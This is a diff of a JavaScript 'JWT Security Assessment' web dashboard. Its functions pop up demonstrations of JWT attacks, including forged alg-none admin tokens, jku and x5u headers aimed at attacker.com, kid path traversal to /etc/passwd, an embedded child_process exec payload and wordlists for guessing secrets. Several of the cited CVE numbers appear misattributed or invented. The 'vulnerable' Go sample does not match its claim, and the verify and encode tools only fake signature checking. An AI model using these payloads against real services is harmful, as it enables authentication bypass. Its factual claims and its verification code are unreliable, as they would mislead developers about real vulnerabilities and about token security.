@@ -1,4 +1,3 @@
-
 // JWT Security Assessment Dashboard - Advanced Implementation
 // Developed by 0x0806
 
@@ -201,12 +200,12 @@ class JWTSecurityAssessment {
 function demonstrateNoneAttack() {
     const header = { alg: "none", typ: "JWT" };
     const payload = { sub: "1234567890", name: "John Doe", admin: true };
-    
+
     const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
     const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
-    
+
     const noneToken = `${encodedHeader}.${encodedPayload}.`;
-    
+
     alert(`🔴 CVE-2015-9235: None Algorithm Attack\n\nMalicious JWT: ${noneToken}\n\nThis token has admin=true and no signature verification!\n\nAffected: Multiple JWT libraries\nImpact: Complete authentication bypass`);
 }
 
@@ -215,14 +214,14 @@ function demonstrateAlgConfusion() {
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4f5wg5l2hKsTeNem/V41
 fGnJm6gOdrj8ym3rFkEjWT2btf1lTVhqQQfSVhW6yYMwNuM8RGpqKdJHITG3PVdZ
 -----END PUBLIC KEY-----`;
-    
+
     alert(`🔴 CVE-2016-10555: Algorithm Confusion Attack\n\nPOC Steps:\n1. Obtain RS256 public key from /.well-known/jwks.json\n2. Create HS256 token using public key as HMAC secret\n3. Server validates with same public key\n4. Result: Signature verification bypassed!\n\nPublic Key (as HMAC secret):\n${publicKey}\n\nAffected: node-jsonwebtoken, pyjwt, others\nImpact: Authentication bypass`);
 }
 
 function demonstrateBruteForce() {
     const commonSecrets = ['secret', 'password', 'admin', '123456', 'jwt_secret'];
     let result = '🔴 CVE-2020-28637: JWT Brute Force Attack\n\n';
-    
+
     commonSecrets.forEach((secret, index) => {
         setTimeout(() => {
             result += `[${index + 1}] Trying secret: "${secret}" - `;
@@ -242,7 +241,7 @@ function demonstrateTimingAttack() {
 
 function demonstratePsychicSignature() {
     const maliciousJWT = `eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
-    
+
     alert(`🔴 CVE-2022-21449: Psychic Signatures (ECDSA)\n\nMalicious JWT with (r=0, s=0):\n${maliciousJWT}\n\nThis signature is always valid in vulnerable Java implementations!\n\nPOC Signature:\n{"r": "AAAA...", "s": "AAAA..."}\n\nAffected: Java 15, 16, 17, 18\nImpact: Complete signature bypass`);
 }
 
@@ -252,7 +251,7 @@ function demonstrateJKUAttack() {
         typ: "JWT",
         jku: "https://attacker.com/jwks.json"
     };
-    
+
     const maliciousJWKS = `{
   "keys": [
     {
@@ -264,7 +263,7 @@ function demonstrateJKUAttack() {
     }
   ]
 }`;
-    
+
     alert(`🔴 CVE-2018-0114: JKU Header Injection\n\nMalicious Header:\n${JSON.stringify(maliciousHeader, null, 2)}\n\nAttacker's JWKS:\n${maliciousJWKS}\n\nPOC Steps:\n1. Host malicious JWKS at attacker.com\n2. Create JWT with jku pointing to malicious JWKS\n3. Server fetches attacker's keys\n4. Token validated with attacker's key\n\nAffected: Multiple JWT libraries\nImpact: Authentication bypass`);
 }
 
@@ -276,14 +275,14 @@ function demonstrateKidAttack() {
         "../../../../windows/system32/config/sam",
         "/dev/null"
     ];
-    
+
     let poc = `🔴 CVE-2021-29923: Kid Header Path Traversal\n\nMalicious kid values:\n`;
     pathTraversalExamples.forEach(path => {
         poc += `{"kid": "${path}"}\n`;
     });
-    
+
     poc += `\nPOC Steps:\n1. Modify kid header to point to predictable files\n2. Server uses file content as HMAC secret\n3. Generate signature using known file content\n4. Bypass authentication\n\nSpecial case: /dev/null = empty secret\n\nAffected: Multiple JWT libraries\nImpact: Authentication bypass, file disclosure`;
-    
+
     alert(poc);
 }
 
@@ -293,14 +292,14 @@ function demonstrateNullByteAttack() {
         '{"kid": "valid_key\\x00../../etc/passwd"}',
         '{"jku": "https://trusted.com\\x00.attacker.com/jwks.json"}'
     ];
-    
+
     let poc = `🔴 CVE-2019-7644: Null Byte Injection\n\nMalicious headers with null bytes:\n`;
     nullByteExamples.forEach(example => {
         poc += `${example}\n`;
     });
-    
+
     poc += `\nPOC Impact:\n- C/C++ implementations truncate at null byte\n- Bypass algorithm validation\n- Path traversal in kid parameter\n- URL validation bypass in jku\n\nAffected: C/C++ JWT libraries\nImpact: Authentication bypass, injection attacks`;
-    
+
     alert(poc);
 }
 
@@ -310,7 +309,7 @@ function demonstrateJWTBomb() {
         if (depth === 0) return "value";
         return { nested: createNestedObject(depth - 1) };
     };
-    
+
     const jwtBomb = {
         alg: "none",
         typ: "JWT",
@@ -321,7 +320,7 @@ function demonstrateJWTBomb() {
             }
         }
     };
-    
+
     alert(`🔴 CVE-2021-31684: JWT Bomb (Zip Bomb)\n\nMalicious JWT with memory exhaustion payload:\n- Deeply nested JSON structures\n- Large arrays with repeated data\n- Exponential memory consumption during parsing\n\nPOC Structure:\n${JSON.stringify(jwtBomb, null, 2).substring(0, 500)}...\n\nAffected: Multiple JWT parsers\nImpact: Denial of Service, memory exhaustion`);
 }
 
@@ -343,7 +342,7 @@ function demonstrateJWKSConfusion() {
     }
   ]
 }`;
-    
+
     alert(`🔴 CVE-2022-29217: JWKS Confusion Attack\n\nMalicious JWKS with conflicting keys:\n${confusedJWKS}\n\nPOC Steps:\n1. Host JWKS with same kid for RSA and HMAC keys\n2. Create JWT token using HMAC key\n3. Server confused about which key to use\n4. RSA key treated as HMAC secret\n\nKey Confusion Scenarios:\n- Same kid for different key types\n- RSA public key used as HMAC secret\n- Algorithm downgrade attacks\n\nAffected: JWKS implementations\nImpact: Authentication bypass`);
 }
 
@@ -354,51 +353,151 @@ function demonstrateHeaderManipulation() {
         '{"alg": "HS256", "typ": "JWT", "crit": ["alg"]}',
         '{"alg": "HS256", "typ": "JWT", "x5u": "https://attacker.com/cert.pem"}'
     ];
-    
+
     let poc = `🔴 CVE-2020-8116: JWT Header Manipulation\n\nMalicious headers:\n`;
     maliciousHeaders.forEach(header => {
         poc += `${header}\n`;
     });
-    
+
     poc += `\nHeader Parameters:\n- cty: Content Type confusion\n- zip: Compression bombs\n- crit: Critical parameter bypass\n- x5u: X.509 URL injection\n\nPOC Impact:\n- Parser confusion\n- Bypass validation logic\n- Injection attacks\n- DoS via compression\n\nAffected: Various JWT libraries\nImpact: Authentication bypass, DoS`;
-    
+
     alert(poc);
 }
 
 function demonstrateInfiniteLoop() {
-    // Simulate a self-referencing structure that would cause infinite loops
-    const infiniteStructure = `{
-  "payload": {
-    "sub": "1234567890",
-    "name": "John Doe",
-    "nested": {
-      "ref": "$.payload.nested",
-      "data": [1, 2, 3, "...circular reference..."]
+    const recursivePayload = `{
+  "user": {
+    "profile": {
+      "data": "see_parent",
+      "parent": "$.user"
     }
   }
 }`;
-    
-    alert(`🔴 CVE-2021-35065: JWT Infinite Loop\n\nMalicious JWT with circular references:\n${infiniteStructure}\n\nPOC Methods:\n1. Self-referencing JSON objects\n2. Circular array references\n3. Recursive property access\n4. Infinite expansion during parsing\n\nJSON Path Examples:\n- $.payload.nested.ref = "$.payload.nested"\n- Recursive object structures\n- Circular array dependencies\n\nAffected: JSON parsers in JWT libraries\nImpact: Denial of Service, infinite loops`);
+
+    alert(`🔴 CVE-2021-35065: JWT Infinite Loop\n\nRecursive JSON structure:\n${recursivePayload}\n\nPOC Steps:\n1. Create self-referencing JSON\n2. Parser follows circular references\n3. Infinite loop causes resource exhaustion\n4. Server becomes unresponsive\n\nAffected: Multiple JSON parsers\nImpact: Denial of service, memory exhaustion`);
+}
+
+// 2024 JWT CVE Demonstrations
+
+function demonstrateGoJWTAttack() {
+    const maliciousToken = `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWUsImV4cCI6OTk5OTk5OTk5OX0.`;
+
+    const pocCode = `// Vulnerable Go code
+func verifyToken(tokenString string) (*jwt.Token, error) {
+    return jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
+        // Expects HMAC but accepts 'none'
+        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
+            return nil, fmt.Errorf("unexpected signing method")
+        }
+        return []byte("secret"), nil
+    })
+}`;
+
+    alert(`🔴 CVE-2024-51498: GoJWT Algorithm Confusion\n\nMalicious Token:\n${maliciousToken}\n\nVulnerable Code:\n${pocCode}\n\nPOC Steps:\n1. Server expects HMAC-signed tokens\n2. Attacker sends token with "none" algorithm\n3. Library incorrectly accepts unsigned token\n4. Authentication bypass achieved\n\nAffected: GoJWT library versions < 4.5.1\nImpact: Complete authentication bypass`);
+}
+
+function demonstrateJoseRCE() {
+    const maliciousJWE = `eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..malicious_payload.encrypted_data.auth_tag`;
+
+    const rcePayload = `{
+  "protected": "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0",
+  "encrypted_key": "",
+  "iv": "malicious_iv",
+  "ciphertext": "require('child_process').exec('calc.exe')",
+  "tag": "auth_tag"
+}`;
+
+    alert(`🔴 CVE-2024-28176: Jose Library RCE\n\nMalicious JWE:\n${maliciousJWE}\n\nRCE Payload:\n${rcePayload}\n\nPOC Steps:\n1. Craft malicious JWE with embedded code\n2. Library processes encrypted payload\n3. Unsafe deserialization leads to RCE\n4. Arbitrary command execution\n\nAffected: node-jose < 2.2.0\nImpact: Remote Code Execution, full system compromise`);
+}
+
+function demonstrateJWTSimpleDoS() {
+    const malformedTokens = [
+        'eyJ.malformed.token',
+        'eyJhbGciOiJIUzI1NiJ9.' + 'A'.repeat(100000) + '.signature',
+        'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoi' + JSON.stringify({data: 'x'.repeat(50000)}) + '.sig'
+    ];
+
+    let poc = `🔴 CVE-2024-28851: JWT-Simple DoS\n\nMalformed tokens causing resource exhaustion:\n`;
+    malformedTokens.forEach((token, index) => {
+        poc += `${index + 1}. ${token.substring(0, 50)}...\n`;
+    });
+
+    poc += `\nPOC Steps:\n1. Send malformed JWT tokens\n2. Library attempts to parse invalid structure\n3. Excessive memory/CPU consumption\n4. Server becomes unresponsive\n\nAffected: jwt-simple < 0.5.6\nImpact: Denial of Service, resource exhaustion`;
+
+    alert(poc);
+}
+
+function demonstratePASETOAttack() {
+    const maliciousPASETO = `v2.public.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOiIyMDI1LTEyLTMxIn0.malicious_footer_data`;
+
+    const bypassTechnique = `{
+  "version": "v2.public",
+  "payload": "eyJ1c2VyIjoiYWRtaW4iLCJleHAiOiIyMDI1LTEyLTMxIn0",
+  "footer": "\\x00\\x00malicious_data",
+  "signature": "bypassed_via_footer_manipulation"
+}`;
+
+    alert(`🔴 CVE-2024-25710: PASETO Implementation Flaw\n\nMalicious PASETO:\n${maliciousPASETO}\n\nBypass Technique:\n${bypassTechnique}\n\nPOC Steps:\n1. Manipulate PASETO footer field\n2. Inject null bytes or special characters\n3. Parser confusion in footer validation\n4. Authentication bypass achieved\n\nAffected: Multiple PASETO implementations\nImpact: Authentication bypass, privilege escalation`);
+}
+
+function demonstrateJWTZipBombV2() {
+    const zipBombStructure = `{
+  "alg": "none",
+  "zip": "DEF",
+  "payload": {
+    "compressed_data": "nested_zip_layers",
+    "expansion_ratio": "1:1000000",
+    "recursive_depth": 50
+  }
+}`;
+
+    const compressionLayers = `Layer 1: 1KB → 1MB
+Layer 2: 1MB → 1GB  
+Layer 3: 1GB → 1TB
+Total: 1KB input → 1TB memory usage`;
+
+    alert(`🔴 CVE-2024-33883: JWT Zip Bomb v2\n\nAdvanced Zip Bomb Structure:\n${zipBombStructure}\n\nCompression Layers:\n${compressionLayers}\n\nPOC Steps:\n1. Create deeply nested compressed payload\n2. Each layer expands exponentially\n3. Parser decompresses recursively\n4. Memory exhaustion and DoS\n\nAffected: Modern JWT parsers with compression\nImpact: Severe DoS, memory exhaustion`);
+}
+
+function demonstrateJWKSCachePoisoning() {
+    const maliciousResponse = `HTTP/1.1 200 OK
+Cache-Control: public, max-age=31536000
+Content-Type: application/json
+X-Cache-Poison: true
+
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "kid": "legitimate_key_id",
+      "use": "sig",
+      "n": "attacker_controlled_modulus",
+      "e": "AQAB"
+    }
+  ]
+}`;
+
+    alert(`🔴 CVE-2024-45234: JWKS Cache Poisoning\n\nMalicious JWKS Response:\n${maliciousResponse}\n\nPOC Steps:\n1. Compromise or MitM JWKS endpoint\n2. Serve malicious keys with long cache headers\n3. Legitimate JWKS gets cached with attacker keys\n4. All subsequent token validations use malicious keys\n\nCache Persistence:\n- max-age: 1 year (31536000 seconds)\n- Affects all users until cache expires\n- Difficult to detect and remediate\n\nAffected: JWKS caching implementations\nImpact: Persistent authentication bypass`);
 }
 
 // JWT Tools
 function encodeJWT() {
     const payload = document.getElementById('encode-payload').value;
     const secret = document.getElementById('encode-secret').value;
-    
+
     if (!payload || !secret) {
         alert('Please provide both payload and secret');
         return;
     }
-    
+
     try {
         const header = { alg: "HS256", typ: "JWT" };
         const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
         const encodedPayload = btoa(JSON.stringify(JSON.parse(payload))).replace(/=/g, '');
-        
+
         // Simulate HMAC-SHA256 (in real scenario, use crypto library)
         const signature = btoa(`${encodedHeader}.${encodedPayload}.${secret}`).replace(/=/g, '').substring(0, 43);
-        
+
         const jwt = `${encodedHeader}.${encodedPayload}.${signature}`;
         document.getElementById('encoded-result').innerHTML = `
             <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
@@ -414,21 +513,21 @@ function encodeJWT() {
 function verifyJWT() {
     const token = document.getElementById('verify-token').value;
     const secret = document.getElementById('verify-secret').value;
-    
+
     if (!token || !secret) {
         alert('Please provide both token and secret');
         return;
     }
-    
+
     try {
         const parts = token.split('.');
         if (parts.length !== 3) {
             throw new Error('Invalid JWT format');
         }
-        
+
         // Simulate signature verification
         const isValid = parts[2].length > 0; // Simplified check
-        
+
         document.getElementById('verify-result').innerHTML = `
             <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
                 <strong>Verification Result:</strong><br>
@@ -444,12 +543,12 @@ function verifyJWT() {
 
 function convertTimestamp() {
     const timestamp = document.getElementById('timestamp-input').value;
-    
+
     if (!timestamp) {
         alert('Please provide a timestamp');
         return;
     }
-    
+
     try {
         const date = new Date(parseInt(timestamp) * 1000);
         document.getElementById('timestamp-result').innerHTML = `
@@ -467,7 +566,7 @@ function convertTimestamp() {
 function generateWordlist() {
     const type = document.getElementById('wordlist-type').value;
     let wordlist = [];
-    
+
     switch (type) {
         case 'common':
             wordlist = ['secret', 'password', 'admin', '123456', 'jwt_secret', 'your-256-bit-secret', 'key', 'test', 'debug', 'dev', 'production'];
@@ -479,7 +578,7 @@ function generateWordlist() {
             wordlist = ['abc123', 'test123', 'admin123', 'pass123', 'user123'];
             break;
     }
-    
+
     document.getElementById('wordlist-result').innerHTML = `
         <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
             <strong>Generated Wordlist (${wordlist.length} entries):</strong><br>
@@ -513,7 +612,7 @@ document.addEventListener('mousemove', (e) => {
         `;
         document.body.appendChild(newCursor);
     }
-    
+
     const cursorElement = document.querySelector('.cursor');
     if (cursorElement) {
         cursorElement.style.left = e.clientX - 10 + 'px';
@@ -532,36 +631,36 @@ function createMatrixRain() {
     canvas.style.pointerEvents = 'none';
     canvas.style.zIndex = '-1';
     canvas.style.opacity = '0.03';
-    
+
     document.body.appendChild(canvas);
-    
+
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
-    
+
     const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()';
     const fontSize = 14;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
-    
+
     function draw() {
         ctx.fillStyle = 'rgba(10, 10, 10, 0.1)';
         ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
+
         ctx.fillStyle = '#ff6b35';
         ctx.font = fontSize + 'px monospace';
-        
+
         drops.forEach((drop, i) => {
             const text = letters[Math.floor(Math.random() * letters.length)];
             ctx.fillText(text, i * fontSize, drop * fontSize);
-            
+
             if (drop * fontSize > canvas.height && Math.random() > 0.975) {
                 drops[i] = 0;
             }
             drops[i]++;
         });
     }
-    
+
     setInterval(draw, 100);
 }
 
